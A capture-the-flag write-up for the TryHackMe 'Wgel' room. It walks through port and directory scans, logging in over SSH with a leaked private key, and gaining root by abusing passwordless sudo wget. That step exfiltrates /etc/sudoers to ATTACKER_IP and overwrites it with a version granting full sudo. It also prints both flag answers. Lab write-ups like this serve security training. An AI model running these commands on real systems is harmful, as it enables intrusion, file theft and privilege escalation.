## Index

1. [Setup](#setup)
2. [Reconnaissance](#reconnaissance)
3. [Exploitation](#exploitation)
4. [Conclusion](#conclusion)

## Setup 

We first need to connect to the tryhackme VPN server. You can get more information regarding this by visiting the [Access](https://tryhackme.com/access) page.

I'll be using `openvpn` to connect to the server. Here's the command:

```shell-session
$ sudo openvpn --config NovusEdge.ovpn
```

## Reconnaissance

We begin with some port scans:
```shell-session
$ rustscan -b 4500 -a TARGET_IP -r 1-65535 --ulimit 5000 -t 2000 -- -oN rustscan_port_scan.txt 
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

$ rustscan -b 4500 -a TARGET_IP -p 22,80 --ulimit 5000 -t 2000 -- -sV -oN rustscan_service_scan.txt
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The page on port 80 is the default ubuntu apache page. Let's conduct some nice directory enumeration:
```shell-session
$ gobuster dir -t 64 -x txt,xml,php -u http://TARGET_IP/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -o gobuster_common.txt
/sitemap              (Status: 301) [Size: 312] [--> http://TARGET_IP/sitemap/]
/server-status        (Status: 403) [Size: 276]
```

Nothing special here, but looking through the page source, we find a comment saying: ` <!-- Jessie don't forget to udate the webiste -->`. This is a potential username we can use for brute force attacks...

Visiting the `/sitemap/` directory brings us to a web page that makes use of something called `umap`. Let's try and do some enumeration here:
```shell-session
$ gobuster dir -t 64 -x txt,xml,php -u http://TARGET_IP/sitemap/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -o gobuster_common.txt
/.hta                 (Status: 403) [Size: 276]
/.hta.php             (Status: 403) [Size: 276]
/.hta.xml             (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/.htaccess.xml        (Status: 403) [Size: 276]
/.hta.txt             (Status: 403) [Size: 276]
/.htpasswd.txt        (Status: 403) [Size: 276]
/.htaccess.txt        (Status: 403) [Size: 276]
/.htpasswd.php        (Status: 403) [Size: 276]
/.htpasswd.xml        (Status: 403) [Size: 276]
/.ssh                 (Status: 301) [Size: 317] [--> http://TARGET_IP/sitemap/.ssh/]
/.htaccess.php        (Status: 403) [Size: 276]
/css                  (Status: 301) [Size: 316] [--> http://TARGET_IP/sitemap/css/]
/fonts                (Status: 301) [Size: 318] [--> http://TARGET_IP/sitemap/fonts/]
/images               (Status: 301) [Size: 319] [--> http://TARGET_IP/sitemap/images/]
/index.html           (Status: 200) [Size: 21080]
/js                   (Status: 301) [Size: 315] [--> http://TARGET_IP/sitemap/js/]
```

The `/.ssh/` directory is accessible and gives us a "`id_rsa`" file, which can be used to log into the ssh service on port 22 (using the username `jessie`):
```shell-session
$ wget http://TARGET_IP/sitemap/.ssh/id_rsa
$ chmod 600 id_rsa
$ ssh -i id_rsa jessie@TARGET_IP
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-45-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


8 packages can be updated.
8 updates are security updates.

jessie@CorpOne:~$
```

And we're in! Let's move onto the exploitation phase

## Exploitation
```shell-session
jessie@CorpOne:~$ ls ./*
./examples.desktop

./Desktop:

./Documents:
user_flag.txt

./Downloads:

./Music:

./Pictures:

./Public:

./Templates:

./Videos:
jessie@CorpOne:~$ cat Documents/user_flag.txt 
057c67131c3d5e42dd5cd3075b198ff6
```

> User flag
> 
> Answer: `057c67131c3d5e42dd5cd3075b198ff6`

Let's do some basic user/OS recon before trying to escalate privileges:
```shell-session
jessie@CorpOne:~$ uname -a
Linux CorpOne 4.15.0-45-generic #48~16.04.1-Ubuntu SMP Tue Jan 29 18:03:19 UTC 2019 i686 i686 i686 GNU/Linux

jessie@CorpOne:~$ cat /etc/issue
Ubuntu 16.04.6 LTS \n \l

jessie@CorpOne:~$ sudo -l
Matching Defaults entries for jessie on CorpOne:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
```

Since `jessie` can execute `wget` with root privileges and no passwords, we can try and gain a root shell by exploiting this:
```shell-session
## On our machine:
$ nc -nvlp 8888 > sudoers

## On target machine:
jessie@CorpOne:~$ sudo wget --post-file=/etc/sudoers ATTACKER_IP:8888
```

Now, we terminate the listener and change the `sudoers` file's contents to the following:
```txt
#
# This file MUST be edited with the 'visudo' command as root.
#
# Please consider adding local content in /etc/sudoers.d/ instead of
# directly modifying this file.
#
# See the man page for details on how to write a sudoers file.
#
Defaults        env_reset
Defaults        mail_badpass
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"

# Host alias specification

# User alias specification

# Cmnd alias specification

# User privilege specification
root    ALL=(ALL:ALL) ALL

# Members of the admin group may gain root privileges
%admin ALL=(ALL) ALL

# Allow members of group sudo to execute any command
%sudo   ALL=(ALL:ALL) ALL

# See sudoers(5) for more information on "#include" directives:

#includedir /etc/sudoers.d
# jessie        ALL=(root) NOPASSWD: /usr/bin/wget
jessie  ALL=(ALL) NOPASSWD: ALL
```

Then, we start a `http` server and fetch this file onto the target, saving the output into `/etc/sudoers`:
```shell-session
## On our machine:
$ python3 -m http.server 8080 

## On the target machine:
jessie@CorpOne:~$ sudo wget http://ATTACKER_IP:8080/sudoers -O /etc/sudoers
jessie@CorpOne:~$ sudo bash
root@CorpOne:~# cd /root
root@CorpOne:/root# ls
root_flag.txt
root@CorpOne:/root# cat root_flag.txt 
b1b968b37519ad1daa6408188649263d
```

## Conclusion
If this writeup helps, please consider following me on github (https://github.com/NovusEdge) and/or dropping a star on the repository: https://github.com/NovusEdge/thm-writeups

---

- Author: Aliasgar Khimani
- Room: [Wget CTF](https://tryhackme.com/room/wgelctf) by [MrSeth6797](https://tryhackme.com/p/MrSeth6797)
